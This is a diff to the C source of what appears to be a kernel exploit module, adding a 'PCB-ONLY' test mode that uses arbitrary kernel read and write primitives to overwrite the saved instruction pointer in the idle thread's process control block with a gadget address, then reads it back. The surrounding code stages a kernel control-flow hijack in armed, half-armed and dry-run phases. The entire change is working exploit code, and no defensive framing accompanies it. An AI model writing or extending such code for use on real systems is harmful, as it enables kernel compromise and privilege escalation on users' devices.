@@ -35,6 +35,8 @@
  *   fw_ver=0x4:   Phase 1 HALF-ARMED — kdata writes only, NO pcb overwrite
  *                 (diagnose: if this panics → kdata write issue;
  *                            if this survives → PCB write is the problem)
+ *   fw_ver=0x5:   Phase 1 PCB-ONLY — overwrite pcb_rip, NO kdata writes
+ *                 (test: does the PCB overwrite itself work without kdata?)
  *
  * Output layout — Phase 1 (ARM):
  *   [0]   magic "PCBO" (0x5043424F) | status(32)
@@ -177,7 +179,7 @@ static void phase1_arm(uint64_t kdata_base, volatile uint64_t* out,
     out32[1] = 0xAAAA;
     out[1] = kdata_base;
     out[2] = ktext_base;
-    out[3] = dry_run == 1 ? 3 : dry_run == 2 ? 4 : 1;
+    out[3] = dry_run == 1 ? 3 : dry_run == 2 ? 4 : dry_run == 3 ? 5 : 1;
 
     out[4] = pcpu0;
     out[5] = idlethread;
@@ -244,6 +246,16 @@ static void phase1_arm(uint64_t kdata_base, volatile uint64_t* out,
 
         out[24] = kdata_base + KDATA_SENT_OFF;
         out[25] = PCBO_SENTINEL;  /* sentinel WAS written to kdata */
+    } else if (dry_run == 3) {
+        /* PCB-ONLY: overwrite pcb_rip, NO kdata writes */
+        write8(idle_pcb + PCB_RIP, nop_ret);
+
+        /* Readback to confirm */
+        out[21] = read8(idle_pcb + PCB_RIP);
+        out[22] = nop_ret;
+
+        out[24] = 0;  /* no sentinel written */
+        out[25] = 0;
     } else {
         /* DRY RUN: no writes at all */
         out[21] = orig_rip;  /* unchanged */
@@ -358,6 +370,8 @@ int module_start(kproc_args* args)
         phase1_arm(kdata_base, out, out32, 1);   /* DRY RUN */
     } else if (mode == 0x4) {
         phase1_arm(kdata_base, out, out32, 2);   /* HALF-ARMED */
+    } else if (mode == 0x5) {
+        phase1_arm(kdata_base, out, out32, 3);   /* PCB-ONLY */
     } else if (mode == 0x2) {
         phase2_verify(kdata_base, out, out32);
     } else {
